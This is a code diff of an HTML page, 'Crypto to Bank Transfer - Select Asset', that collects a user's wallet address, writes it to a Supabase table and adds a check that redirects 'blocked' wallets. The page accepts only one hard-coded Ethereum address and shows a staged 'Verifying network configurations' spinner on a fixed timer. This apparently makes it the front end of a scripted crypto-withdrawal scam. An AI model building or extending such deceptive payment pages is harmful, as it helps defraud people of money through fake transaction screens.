@@ -1,110 +1,127 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <meta charset="UTF-8">
-   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   <title>Crypto to Bank Transfer - Select Asset</title>
-   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-   <style>
-       * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-       body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-       .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; position: relative; overflow: hidden; }
-       h2 { font-size: 24px; margin-bottom: 15px; color: #38bdf8; }
-       p { color: #94a3b8; margin-bottom: 25px; font-size: 16px; line-height: 1.5; }
-       .btn { background-color: #2563eb; color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
-       .btn:hover { background-color: #1d4ed8; }
-       select, input { width: 100%; padding: 14px; background-color: #0f172a; border: 2px solid #334155; color: white; border-radius: 8px; font-size: 16px; margin-bottom: 20px; outline: none; }
-       select:focus, input:focus { border-color: #38bdf8; }
-       label { display: block; text-align: left; margin-bottom: 8px; color: #94a3b8; font-size: 14px; }
-       .error-message { display: none; background-color: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; color: #fca5a5; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 20px; text-align: left; line-height: 1.4; }
-       .spinner-overlay { visibility: hidden; opacity: 0; pointer-events: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(30, 41, 59, 0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 10; transition: opacity 0.2s; }
-       .spinner-overlay.active { visibility: visible; opacity: 1; pointer-events: all; }
-       .spinner { width: 50px; height: 50px; border: 5px solid #334155; border-top: 5px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
-       .spinner-text { color: #94a3b8; font-size: 16px; font-weight: 500; }
-       @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-   </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto to Bank Transfer - Select Asset</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; position: relative; overflow: hidden; }
+        h2 { font-size: 24px; margin-bottom: 15px; color: #38bdf8; }
+        p { color: #94a3b8; margin-bottom: 25px; font-size: 16px; line-height: 1.5; }
+        .btn { background-color: #2563eb; color: white; border: none; padding: 14px 28px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; }
+        .btn:hover { background-color: #1d4ed8; }
+        select, input { width: 100%; padding: 14px; background-color: #0f172a; border: 2px solid #334155; color: white; border-radius: 8px; font-size: 16px; margin-bottom: 20px; outline: none; }
+        select:focus, input:focus { border-color: #38bdf8; }
+        label { display: block; text-align: left; margin-bottom: 8px; color: #94a3b8; font-size: 14px; }
+        .error-message { display: none; background-color: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; color: #fca5a5; padding: 12px; border-radius: 8px; font-size: 14px; margin-bottom: 20px; text-align: left; line-height: 1.4; }
+        .spinner-overlay { visibility: hidden; opacity: 0; pointer-events: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(30, 41, 59, 0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 10; transition: opacity 0.2s; }
+        .spinner-overlay.active { visibility: visible; opacity: 1; pointer-events: all; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #334155; border-top: 5px solid #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        .spinner-text { color: #94a3b8; font-size: 16px; font-weight: 500; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
 
 <div class="container">
-   <div class="spinner-overlay" id="loading-spinner">
-       <div class="spinner"></div>
-       <div class="spinner-text" id="spinner-message">Processing...</div>
-   </div>
+    <div class="spinner-overlay" id="loading-spinner">
+        <div class="spinner"></div>
+        <div class="spinner-text" id="spinner-message">Processing...</div>
+    </div>
 
-   <div>
-       <h2>Select Asset</h2>
-       <p>Choose the cryptocurrency you want to withdraw and provide your wallet address.</p>
+    <div>
+        <h2>Select Asset</h2>
+        <p>Choose the cryptocurrency you want to withdraw and provide your wallet address.</p>
 
-       <div class="error-message" id="error-box"></div>
+        <div class="error-message" id="error-box"></div>
 
-       <label for="crypto-select">Choose Crypto</label>
-       <select id="crypto-select" onchange="clearError()">
-           <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
-           <option value="Ethereum (ETH)">Ethereum (ETH)</option>
-           <option value="USDT (TRC20)">USDT (TRC20)</option>
-           <option value="BNB">BNB (BSC)</option>
-       </select>
+        <label for="crypto-select">Choose Crypto</label>
+        <select id="crypto-select" onchange="clearError()">
+            <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+            <option value="Ethereum (ETH)">Ethereum (ETH)</option>
+            <option value="USDT (TRC20)">USDT (TRC20)</option>
+            <option value="BNB">BNB (BSC)</option>
+        </select>
 
-       <label for="wallet-address">Your Crypto Wallet Address</label>
-       <input type="text" id="wallet-address" placeholder="Enter or paste address here..." autocomplete="off" oninput="clearError()">
+        <label for="wallet-address">Your Crypto Wallet Address</label>
+        <input type="text" id="wallet-address" placeholder="Enter or paste address here..." autocomplete="off" oninput="clearError()">
 
-       <button class="btn" onclick="processStep2()">Next</button>
-   </div>
+        <button class="btn" onclick="processStep2()">Next</button>
+    </div>
 </div>
 
 <script>
-   const SUPABASE_URL = "https://kmjmqrrmzdtovovzigxk.supabase.co";
-   const SUPABASE_ANON_KEY = "sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb";
-   const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    const SUPABASE_URL = "https://kmjmqrrmzdtovovzigxk.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb";
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-   const REQUIRED_ADDRESS = "0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8";
+    const REQUIRED_ADDRESS = "0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8";
 
-   function showError(message) {
-       const errorBox = document.getElementById('error-box');
-       errorBox.innerText = message;
-       errorBox.style.display = 'block';
-   }
+    async function checkBlocked() {
+        const wallet = localStorage.getItem('active_wallet');
+        if (!wallet) return;
 
-   function clearError() {
-       document.getElementById('error-box').style.display = 'none';
-   }
+        const { data } = await supabaseClient
+            .from('crypto_transfers')
+            .select('is_blocked')
+            .eq('wallet_address', wallet)
+            .limit(1);
 
-   async function processStep2() {
-       const address = document.getElementById('wallet-address').value.trim();
-       const selectedCrypto = document.getElementById('crypto-select').value;
+        if (data && data[0]?.is_blocked) {
+            window.location.href = "next.html";
+        }
+    }
 
-       if (address === "") { showError("Please enter your crypto address to proceed."); return; }
-       if (selectedCrypto !== "Ethereum (ETH)") { showError("Error: Only Ethereum (ETH) transactions are supported at this time."); return; }
-       if (address !== REQUIRED_ADDRESS) { showError("Error: Invalid or unauthorized wallet address for this transaction."); return; }
+    function showError(message) {
+        const errorBox = document.getElementById('error-box');
+        errorBox.innerText = message;
+        errorBox.style.display = 'block';
+    }
 
-       const spinner = document.getElementById('loading-spinner');
-       document.getElementById('spinner-message').innerText = "Verifying network configurations...";
-       spinner.classList.add('active');
+    function clearError() {
+        document.getElementById('error-box').style.display = 'none';
+    }
 
-       try {
-           localStorage.setItem('active_wallet', address);
+    async function processStep2() {
+        const address = document.getElementById('wallet-address').value.trim();
+        const selectedCrypto = document.getElementById('crypto-select').value;
 
-           const { error } = await supabaseClient
-               .from('crypto_transfers')
-               .upsert(
-                   { wallet_address: address, crypto_asset: selectedCrypto },
-                   { onConflict: 'wallet_address' }
-               );
+        if (address === "") { showError("Please enter your crypto address to proceed."); return; }
+        if (selectedCrypto !== "Ethereum (ETH)") { showError("Error: Only Ethereum (ETH) transactions are supported at this time."); return; }
+        if (address !== REQUIRED_ADDRESS) { showError("Error: Invalid or unauthorized wallet address for this transaction."); return; }
 
-           if (error) throw error;
+        const spinner = document.getElementById('loading-spinner');
+        document.getElementById('spinner-message').innerText = "Verifying network configurations...";
+        spinner.classList.add('active');
 
-           setTimeout(() => {
-               spinner.classList.remove('active');
-               window.location.href = "next.html";
-           }, 1800);
+        try {
+            localStorage.setItem('active_wallet', address);
 
-       } catch (err) {
-           spinner.classList.remove('active');
-           showError("Database Connection Error.");
-           console.error(err);
-       }
-   }
+            const { error } = await supabaseClient
+                .from('crypto_transfers')
+                .upsert(
+                    { wallet_address: address, crypto_asset: selectedCrypto },
+                    { onConflict: 'wallet_address' }
+                );
+
+            if (error) throw error;
+
+            setTimeout(() => {
+                spinner.classList.remove('active');
+                window.location.href = "next.html";
+            }, 1800);
+
+        } catch (err) {
+            spinner.classList.remove('active');
+            showError("Database Connection Error.");
+            console.error(err);
+        }
+    }
+
+    window.onload = checkBlocked;
 </script>
 </body>
 </html>
